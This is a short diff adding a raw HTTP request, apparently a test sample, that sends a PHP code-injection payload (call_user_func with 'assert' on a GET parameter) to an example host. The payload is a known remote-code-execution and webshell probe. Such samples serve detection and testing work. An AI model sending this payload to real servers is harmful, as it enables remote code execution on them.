@@ -1,0 +1,4 @@
+GET /a?data=call_user_func(\u0027assert\u0027,$_GET[1]) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
